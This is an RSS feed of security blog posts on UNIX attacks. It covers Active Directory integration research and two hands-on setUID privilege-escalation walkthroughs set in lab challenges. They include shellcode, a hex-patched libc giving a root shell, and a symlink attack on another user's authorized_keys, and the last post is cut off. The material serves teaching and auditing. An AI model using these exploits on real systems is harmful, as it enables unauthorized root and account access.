@@ -1,0 +1,935 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; UNIX</title>
+	<atom:link href="https://labs.portcullis.co.uk/tag/unix/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>An offensive introduction to Active Directory on UNIX</title>
+		<link>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/</link>
+		<comments>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/#comments</comments>
+		<pubDate>Thu, 06 Dec 2018 09:18:36 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[Black Hat Europe]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6805</guid>
+		<description><![CDATA[<p>By way of an introduction to our talk at Black Hat Europe, Security Advisory EMEAR would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests. Background to Active Directory integration [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>By way of an introduction to <a href="https://www.blackhat.com/eu-18/briefings/schedule/index.html#where-2-worlds-collide-bringing-mimikatz-et-al-to-unix-12962" title="our talk">our talk</a> at Black Hat Europe, <a href="https://www.cisco.com/c/en/us/products/security/advisory-services.html" title="Security Advisory EMEAR">Security Advisory EMEAR</a> would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests.<span id="more-6805"></span></p>
+<h2>Background to Active Directory integration solutions</h2>
+<p>Having seen an uptick in unique UNIX infrastructures that are integrated into customers&#8217; existing Active Directory forests, the question becomes, &#8220;Does this present any concerns that may not be well understood?&#8221; This quickly became &#8220;What if an adversary could get into a UNIX box and then breach your domain?&#8221;<br />
+Within a typical Active Directory integration solution (in this case <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/5.7_release_notes/sssd" title="SSSD">SSSD</a>), the solution shares a striking similarity to what a user might see on Windows. Notably, you have:</p>
+<ul>
+<li>DNS &#8211; Used for name resolution</li>
+<li>LDAP &#8211; Used for &#8220;one-time identification&#8221; and assertion of identity</li>
+<li>Kerberos &#8211; Used for ongoing authentication</li>
+<li>SSSD &#8211; Like LSASS</li>
+<li>PAM &#8211; Like msgina.dll or the more modern credential providers</li>
+</ul>
+<p>You can see a breakdown of this process <a title="here" href="https://rhelblog.redhat.com/2015/02/04/overview-of-direct-integration-options/">here</a>. Unlike Windows, there is no Group Policy for the most part (with some exceptions), so policies for sudo et al. are typically pushed as flat files to hosts.</p>
+<h2>Our research</h2>
+<p>Realistically, the threat models associated with each part of the implementation should be quite familiar to anyone securing a heterogeneous Windows network. Having worked with a variety of customers, it becomes apparent that the typical UNIX administrator who does not have a strong background in Windows and Active Directory will be ill-equipped to handle this threat. While we&#8217;ve been talking about successful attacks against components such as LSASS and Kerberos for quite some time, Mimikatz dates back to at least April 2014, and dumping hashes has been around even longer. Pwdump, which dumped local Windows hashes, was published by Jeremy Allison in 1997). However, no one has really taken a concerted look at whether these attacks are possible on UNIX infrastructure, nor how a blue team might spot an adversary performing them.</p>
+<p>As a result of this research, we were able to develop tactics, tools, and procedures that might further assist an attacker in breaching an enterprise, and we began documenting and developing appropriate strategies to allow blue teams to appropriately detect and respond to such incursions. The Black Hat EU slides can be found <a title="here" href="/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">here</a> and whilst the tools we developed can be found on <a href="https://github.com/portcullislabs/linikatz" title="our GitHub repo">our GitHub repo</a>.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Where 2 worlds collide: Bringing Mimikatz et al to UNIX</title>
+		<link>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/</link>
+		<comments>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/#comments</comments>
+		<pubDate>Thu, 06 Dec 2018 08:04:06 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Presentations]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[Black Hat Europe]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6806</guid>
+		<description><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018). Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018).<span id="more-6806"></span></p>
+<p>Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may not be as well understood by a typical UNIX admin who does not have a strong background in Windows and AD. Over the last few months we&#8217;ve spent some time looking a number of specific Active Directory integration solutions (both open and closed source) for UNIX systems and documenting some of the tools, tactics and procedures that enable attacks on the forest to be staged from UNIX.</p>
+<p>This talk describes the technical details regarding our findings. It includes Proof of Concepts (PoC) showing real-world attacks against AD joined UNIX systems. Finally, potential solutions or mitigation controls are discussed that will help to either prevent those attacks or at the very least to detect them when they occur.</p>
+<p>Tools referenced in this talk include:</p>
+<ul>
+<li><a href="https://github.com/portcullislabs/linikatz" title="Linikatz">Linikatz</a></li>
+<ul>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/red/JohnTheRipper" title="JohnTheRipper dynamic.conf rules">JohnTheRipper dynamic.conf rules</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/red/metasploit-framework" title="metasploit-framework post-exploitation modules">metasploit-framework post-exploitation modules</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/blue/audit" title="auditd policies">auditd policies</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/tools/vas/fuzzers" title="fuzzers">fuzzers</a></li>
+</ul>
+</ul>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" title="Download Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" title="Download eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" id="wpfb-file-link-1">eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf</a>
+    
+    <br />
+    December 6, 2018<br />
+    
+  </div>
+  <div class="info">
+    724.9 KiB<br />
+    MD5 hash: cc712c5e46b16fbff22a2566b1248a91 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>December 6, 2018</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>SetUID program exploitation: Crafting shared object files without a compiler</title>
+		<link>https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/</link>
+		<comments>https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/#comments</comments>
+		<pubDate>Wed, 31 Oct 2018 12:18:59 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6581</guid>
+		<description><![CDATA[<p>In this post we look at an alternative to compiling shared object files when exploiting vulnerable setUID programs on Linux. At a high level we&#8217;re just going to copy the binary and insert some shellcode. First we take a look the circumstances that might lead you to use this option. Also check out this previous post [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/">SetUID program exploitation: Crafting shared object files without a compiler</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In this post we look at an alternative to compiling shared object files when exploiting vulnerable setUID programs on Linux. At a high level we&#8217;re just going to copy the binary and insert some shellcode. First we take a look the circumstances that might lead you to use this option. Also check out this <a title="previous post on setUID exploitation" href="/blog/exploiting-inherited-file-handles-in-setuid-programs">previous post on setUID exploitation</a>.<span id="more-6581"></span></p>
+<h2>A hacker challenge gone wrong</h2>
+<p>A long time ago, I set my team challenge of identifying an <a title="Breaking the Links: Exploiting the Linker" href="/presentations/breaking-the-links-exploiting-the-linker/">RPATH vulnerability</a> and (if possible) exploiting the vulnerability to run some code of their choosing with higher privileges. I named my program arp-ath &#8211; lest people wasted too much time looking for other attack vectors:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat arp-ath.c
+#include &lt;stdio.h&gt;
+int main(void) {
+ printf(&quot;Hello world\n&quot;);
+}
+$ gcc -Wl,-rpath,. -o arp-ath arp-ath.c
+# chmod 4755 arp-ath
+</pre>
+<p>The program behaves as you&#8217;d expect and is linked to libc.so.6 as you&#8217;d expect:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./arp-ath
+Hello world
+$ ldd arp-ath
+ linux-vdso.so.1 =&gt; (0x00007fff0a3fd000)
+ libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb6dc0d6000)
+ /lib64/ld-linux-x86-64.so.2 (0x00007fb6dc489000)
+</pre>
+<p>The vulnerability lies in the fact the program seaches the current directory for its libraries:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ readelf -a arp-ath | grep -i path
+0x000000000000000f (RPATH) Library rpath: [.]
+</pre>
+<p>(You&#8217;ll sometimes see RUNPATH instead of RPATH, but both work). Check it&#8217;s vulnerable like this:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ touch libc.so.6
+$ ./arp-ath
+./arp-ath: error while loading shared libraries: ./libc.so.6: file too short
+</pre>
+<p>This challenge is very similar to Level 15 of the <a title="Nebula Challenge" href="https://exploit-exercises.com/nebula/">Nebula challenge</a> if you want to play along using that &#8211; though it&#8217;s 32-bit.</p>
+<p>The team found the &#8220;arp-ath&#8221; vulnerability pretty quickly and replied to let me know. Which you&#8217;d expect as it is their job to find such vulnerabilities on client systems during Build Reviews.</p>
+<p>What I hadn&#8217;t personally anticipated is what a pain it is to create a malicious modified version of libc.so.6 on 64-bit Linux. So rather than face the embarrassment of having posted a challenge that I didn&#8217;t actually have a full solution for, I cobbled together the shellcode-based solution outlined above. First let&#8217;s have a look at the difficulties I had in creating my own libc.so.6.</p>
+<h2>Problems compiling a replacement libc.so.6 on 64-bit Linux</h2>
+<p>I lost my original notes of what I&#8217;d tried, but I&#8217;m pretty sure that I and my colleagues followed a similar path to this <a title="Nebula Level 15 Solution" href="http://www.pwntester.com/blog/2013/11/26/nebula-level15-write-up/">solution to the Nebula level 15 challenge</a> - which has a really nice writeup of how to debug shared libraries that don&#8217;t want to work.</p>
+<p>Here&#8217;s an initial attempt, which should cause a shell to spawn when the library is loaded (note I could also have replaced the &#8220;puts&#8221; function).</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat exploit1.c
+#include &lt;stdlib.h&gt;
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
+ system(&quot;/bin/sh&quot;);
+}
+$ gcc -fPIC -shared -o libc.so.6 exploit1.c
+$ ldd ./arp-ath
+./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
+./arp-ath: ./libc.so.6: no version information available (required by ./libc.so.6)
+linux-vdso.so.1 (0x00007ffeea77d000)
+libc.so.6 =&gt; ./libc.so.6 (0x00007f50430f9000)
+$ ./arp-ath
+./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
+./arp-ath: ./libc.so.6: no version information available (required by ./libc.so.6)
+./arp-ath: relocation error: ./libc.so.6: symbol __cxa_finalize, version GLIBC_2.2.5 not defined in file libc.so.6 with link time reference
+</pre>
+<p>So, let&#8217;s address those errors about lack of version numbers and failure to export __cxa_finalize (after much googling)&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cat version
+GLIBC_2.2.5{};
+$ cat exploit2.c
+#include &lt;stdlib.h&gt;
+
+void __cxa_finalize (void *d) {
+ return;
+}
+
+int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
+ system(&quot;/bin/sh&quot;);
+}
+$ gcc -fPIC -shared -Wl,--version-script=version -o libc.so.6 exploit2.c
+$ ./arp-ath
+./arp-ath: relocation error: ./libc.so.6: symbol system, version GLIBC_2.2.5 not defined in file libc.so.6 with link time reference
+</pre>
+<p>Hmm. More errors.</p>
+<p>Cutting short a very long sequence of trial and error, when we eventually try to replicate the solution to the Nubula level 15 challenge on 64-bit, we find that it only seems to work for 32-bit:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 exploit2.c
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(system.o): relocation R_X86_64_32 against `.bss' can not be used when making a shared object; recompile with -fPIC
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(sysdep.o): relocation R_X86_64_TPOFF32 against symbol `errno' can not be used when making a shared object; recompile with -fPIC
+/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(sigaction.o): relocation R_X86_64_32S against `.text' can not be used when making a shared object; recompile with -fPIC
+/usr/bin/ld: final link failed: Nonrepresentable section on output
+collect2: error: ld returned 1 exit status
+</pre>
+<p>If I understood my googling correctly, I need a version of libc that&#8217;s been compiled with -fPIC, but that&#8217;s not possible for some reason I didn&#8217;t understand.</p>
+<p>I did consider grabbing the source for libc and recompiling it after a modification, but decided life was too short. I had a better (or at least quicker) idea&#8230;</p>
+<h2>So just use metasploit, then?</h2>
+<p>I had a quick go at generating a shared object file with msfvenom:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+msfvenom -a x64 -f elf-so -p linux/x64/exec CMD=/bin/sh AppendExit=true &gt; libc.so.6
+$ ./arp-ath
+./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
+./arp-ath: symbol lookup error: ./arp-ath: undefined symbol: __libc_start_main, version GLIBC_2.2.5
+</pre>
+<p>This was awfully familiar. I didn&#8217;t grapple much more with msfvenom after this.</p>
+<h2>Patching shellcode into a copy of libc.so.6</h2>
+<p>I figured I could open up a copy of libc.so.6 in a hex editor and paste in some shellcode over the top of __libc_start_main function. No matter how horribly I corrupted the file or how badly it crashed after it executed my shellcode, at least I&#8217;d have my shell.</p>
+<p>I grabbed some shellcode off the internet &#8211; but equally could have generated in it Metasploit like this (I also appended a call to exit to stop the inevitable crash I mentioned):</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ msfvenom -a x64 -f hex -p linux/x64/exec CMD=/bin/sh AppendExit=true
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 55 bytes
+Final size of hex file: 110 bytes
+6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e8080000002f62696e2f73680056574889e60f054831ff6a3c580f05
+</pre>
+<p>Then I made a copy of libc.so.6 and located the file offset for the __libc_start_main function:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ cp /lib/x86_64-linux-gnu/libc.so.6 .
+$ objdump -FD libc.so.6 | grep _main
+00000000000201f0 &lt;__libc_start_main@@GLIBC_2.2.5&gt; (File Offset: 0x201f0):
+...
+</pre>
+<p>Using a hexeditor I pasted in the shellcode.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">&lt;/span&gt;
+&lt;pre&gt;$ hexedit libc.so.6
+</pre>
+<div id="attachment_6591" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6582"><div class="lb-album"><a href="#image-6582"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/Screenshot_20180417_181649-300x37.png" alt="Use CTRL-G to seek to the offset in the file" class="size-medium wp-image-6591"><span></span></a></div>              
+<a href="#imageclose-6582" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6582">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/Screenshot_20180417_181649.png" alt="image-6582">
+                   </div></a><p class="wp-caption-text">Use CTRL-G to seek to the offset in the file</p></div>
+<p>(CTRL-G to go to an offset (0x201f0); paste in our shellcode; F2 to save; CTRL-C to quit.)</p>
+<div id="attachment_6592" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6583"><div class="lb-album"><a href="#image-6583"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/Screenshot_20180417_181927-300x115.png" alt="Shellcode pasted over existing code" class="size-medium wp-image-6592"><span></span></a></div>              
+<a href="#imageclose-6583" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-6583">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2018/04/Screenshot_20180417_181927.png" alt="image-6583">
+                   </div></a><p class="wp-caption-text">Shellcode pasted over existing code</p></div>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./arp-ath
+# id
+uid=1000(x) gid=1000(x) euid=0(root) groups=1000(x)
+</pre>
+<p>Finally! <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<h2>And this works on AIX too?</h2>
+<p>I tried to get this working on AIX &#8211; which typically doesn&#8217;t have a C compiler available; AND typically has loads of RPATH vulnerabilities. However, the shellcode I tried was self-modifying. This is fine when you&#8217;re injecting shellcode as data, but the code section I was injecting into was read-only. So I got a segfault. I&#8217;ll follow up if get this working.</p>
+<h2>Conclusion</h2>
+<p>The quick and dirty solution, while inevitably unsatisfactory is sometimes sufficient. Especially given the lack of tools, source, time you might have when exploiting this sort of vulnerabilities. Maybe it&#8217;s not a terrible solution. You be the judge.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/">SetUID program exploitation: Crafting shared object files without a compiler</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Exploiting inherited file handles in setUID programs</title>
+		<link>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/</link>
+		<comments>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/#comments</comments>
+		<pubDate>Thu, 28 Jun 2018 16:00:40 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6538</guid>
+		<description><![CDATA[<p>In this post we look at at one of many security problems that pentesters and security auditors find in setUID programs. It&#8217;s fairly common for child processes to inherit any open file handles in the parent process (though there are ways to avoid this). In certain cases this can present a security flaw. This is [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/">Exploiting inherited file handles in setUID programs</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In this post we look at at one of many security problems that pentesters and security auditors find in setUID programs. It&#8217;s fairly common for child processes to inherit any open file handles in the parent process (though there are ways to avoid this). In certain cases this can present a security flaw. This is what we&#8217;ll look at in the context of setUID programs on Linux.<span id="more-6538"></span></p>
+<p>I was reminded of this technique as I tackled an <a href="https://exploit-exercises.com/nebula/level11/">old hacker challenge</a> recently. This a fun challenge. And there&#8217;s a much easier solution than using the technique I&#8217;m going to cover here. Maybe try both the hard way and the easy way.</p>
+<h2>Example program</h2>
+<p>Here&#8217;s a fairly minimal test case of example code &#8211; inspired by the nebula challenge code.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv)
+{
+ char *cmd = argv[1];
+ char tmpfilepath[] = &quot;/tmp/tmpfile&quot;;  // Modern systems need &quot;sysctl fs.protected_symlinks=0&quot; or &quot;chmod 0777 /tmp&quot; for this to be vulnerable to the symlink attack we'll use later.
+ char data[] = &quot;pointless data\n&quot;;
+
+int fd = open(tmpfilepath, O_CREAT|O_RDWR, 0600);
+ unlink(tmpfilepath);
+ write(fd, data, strlen(data));
+ setuid(getuid());
+ system(cmd);
+}
+</pre>
+<p>Let&#8217;s start by compiling this and setting the setUID bit so we have an example to work with:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/# useradd -m tom # victim/target user
+root@challenge:/# useradd -m bob # attacker
+root@challenge:/# cd ~bob
+root@challenge:/home/bob# cp /share/fd-leak.c .
+root@challenge:/home/bob# gcc -o fd-leak fd-leak.c
+root@challenge:/home/bob# chown tom:tom fd-leak
+root@challenge:/home/bob# chmod 4755 fd-leak
+root@challenge:/home/bob# ls -l fd-leak
+-rwsr-xr-x 1 root root 8624 Apr 12 11:06 fd-leak
+root@challenge:/home/bob# su - bob
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+</pre>
+<p>For exploitation later, we&#8217;ll also need the target user (tom in this case) to have a .ssh directory in their home directory:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/# mkdir ~tom/.ssh; chown tom:tom ~tom/.ssh
+</pre>
+<p>What this program lacks in realism is hopefully made up for in its simplicity.</p>
+<h2>Normal operation</h2>
+<p>As can be seen from the code above, the program should:</p>
+<ol>
+<li>Create the file /tmp/tmpfile, then delete it. A file descriptor is retained</li>
+<li>Drop privileges. This is poor code for dropping privileges, btw. It suffices for this example, though</li>
+<li>Run a command that is supplied as an argument. It should run as the invoking user, not as the target user (tom)</li>
+</ol>
+<p>Let&#8217;s try it out (note that I modify .bashrc to make it clearer to the reader when a subshell has been spawned):</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/home/bob# su - bob
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ echo 'echo subshell...' &gt; .bashrc
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ ./fd-leak bash -p
+subshell...
+bob@challenge:~$ id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+root@challenge:/home/bob# useradd -m tom
+root@challenge:/home/bob# su - tom
+$ mkdir .ssh
+$ ls -la
+total 28
+drwxr-xr-x 3 tom tom 4096 Apr 12 11:42 .
+drwxr-xr-x 2 tom tom 4096 Apr 12 11:42 .ssh
+...
+</pre>
+<p>So, yes fd-leak appears to drop privileges. (Our spawned shell isn&#8217;t responsible for the drop in privileges as I&#8217;ve hopefully illustrated by passing -p to bash above and by running id directly).</p>
+<p>Finally, we expect the child process to inherit a file handle to the now deleted file /tmp/tmpfile:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l /proc/self/fd
+total 0
+lrwx------ 1 bob bob 64 Apr 12 11:22 0 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 1 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 2 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 3 -&gt; '/tmp/tmpfile (deleted)'
+lr-x------ 1 bob bob 64 Apr 12 11:22 4 -&gt; /proc/53982/fd
+</pre>
+<p>It does. We&#8217;re all set.</p>
+<h2>High level exploit path</h2>
+<p>Our approach to attacking this vulnerable program will follow these high level steps which are covered in more detail in the sections below:</p>
+<ol>
+<li>Create a symlink that the vulnerable code will try to write to. This way we can create a file in a location of our choosing and with a name we choose. We&#8217;ll choose ~tom/.ssh/authorized_keys</li>
+<li>We&#8217;ll run some code in the context of a child process to manipulate the open file handle so we can write the contents of authorized_keys file</li>
+<li>Finally, we log with via SSH</li>
+</ol>
+<h2>Practical exploitation</h2>
+<h3>Step 1: Symlink attack</h3>
+<p>Simple:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+</pre>
+<p>This step was harder in the nebula challenge, but I didn&#8217;t want to cloud the issue.</p>
+<p>If we run the code now, we see that the authorized_keys file is created, but we don&#8217;t control the contents.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+ln: failed to create symbolic link '/tmp/tmpfile': File exists
+bob@challenge:~$ ls -l /tmp/tmpfile
+lrwxrwxrwx 1 bob bob 30 Apr 12 12:11 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
+</pre>
